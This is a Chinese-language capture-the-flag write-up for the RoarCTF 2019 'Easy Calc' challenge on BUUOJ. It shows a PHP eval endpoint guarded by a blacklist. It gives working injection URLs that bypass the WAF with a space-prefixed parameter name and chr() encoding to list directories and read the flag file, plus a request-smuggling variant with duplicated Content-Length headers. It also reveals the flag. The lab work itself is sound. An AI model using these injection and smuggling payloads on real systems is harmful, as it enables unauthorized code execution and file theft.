# Easy Calc

[题目地址](https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Calc)

php真的是个大聪明。

给了个计算器。算了个1+1后开始想怎么搞事情。测试了ssti，没有。单引号闭合也不行，直接显示被过滤。检查网页。

```html
<script>
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
</script>
```

还有个calc.php。内容很简单。

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

/m是php里的[正则修饰符](https://blog.jam00.com/article/info/27.html),表示搜索字符串的每一行。不加这个符号遇到换行符会停止。preg_match第一个参数是正则表达式，第二个参数是搜索的字符串。正则表达式的第一个/没有特殊意义。看了一下，别的还好，就是路径必须的符号过滤了，单引号也是。不过我们的php太厉害了，有独特的[字符串解析特性](https://www.freebuf.com/articles/web/213359.html)。

PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => "bar")。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。

假如我们在get参数前面加一个空格，php还能解析这个参数，但是waf不行了。比如这道题，如果传? num=xxx，php收到的内容是 num，空格属于特殊字符，会被删除，变成了num，正常解析。但是waf就不一样了，它收到 num就是 num， num不等于num，写的过滤条件就没用了。由此绕过waf。先用[scandir](https://www.runoob.com/php/func-directory-scandir.html)看看有啥。

- http://node4.buuoj.cn:29549/calc.php?%20num=var_dump(scandir(chr(47)))

var_dump是因为scandir的结果是数组，不dump看不出来。chr(47)是/号，绕calc.php里的过滤（calc.php里面有一层过滤，源码注释里写的“开了waf”是另一种过滤。 num绕的是waf，chr(47)绕的是calc.php，并不是 num没用）。发现f1agg文件。拼一下payload，用[file_get_contents](https://www.runoob.com/php/func-filesystem-file-get-contents.html)读取文件。

```python
data='/f1agg'
for i in data:
    print(f"chr({ord(i)})",end='.')
```

- http://node4.buuoj.cn:29549/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))

得到flag。还有另一种解法，利用[http请求走私](https://qwzf.github.io/2019/10/27/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%88%B0HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/)。

```
GET /calc.php?num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) HTTP/1.1
Host: node4.buuoj.cn:29549
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length:6
Content-Length:6

a
```

注意这次我们没有在num前加空格，只是绕过了calc.php的过滤，仍然可以执行成功。a必须写一个，或者写点别的，不写似乎出不来。

### Flag
- flag{3832c6f8-cfbb-4c28-9f38-f7fe5630e3f6}